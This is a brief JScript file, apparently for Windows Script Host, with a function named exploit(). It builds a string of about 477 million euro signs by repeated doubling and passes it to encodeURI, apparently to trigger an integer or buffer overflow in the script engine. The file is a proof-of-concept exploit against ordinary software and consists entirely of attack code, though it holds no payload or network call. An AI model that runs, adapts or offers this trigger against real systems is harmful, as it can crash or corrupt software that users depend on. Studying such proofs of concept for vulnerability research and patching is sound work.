




function get_n_copies_of(ch, n)
{
    var powers = new Array();

    powers[0] = ch;
    for (var i = 1; (1<<i) < n; i++)
    {
        powers[i] = powers[i-1] + powers[i-1];
    }

    var out = '';

    for (var i = powers.length-1; i >= 0; i--)
    {
        if ((1 << i) > n)
            continue;

        out += powers[i];
        n -= (1 << i);
    }

    return out;
}

function exploit()
{
    
    
    
    var s1 = "\u20ac";
    var ss;
 
    try
    {
        ss = get_n_copies_of(s1, 477218589);
    }
    catch (e)
    {
        WScript.Echo("You don't have enough free memory or VA to run this -- you'll need as much as possible.");
        return;
    }
    
    WScript.Echo("SS length = " + ss.length + "<br/>");

    
    
    
    
    WScript.Echo(encodeURI(ss).length);
}

try {
exploit();
}
catch (e)
{
   WScript.Echo("Message: " + e.message);
}
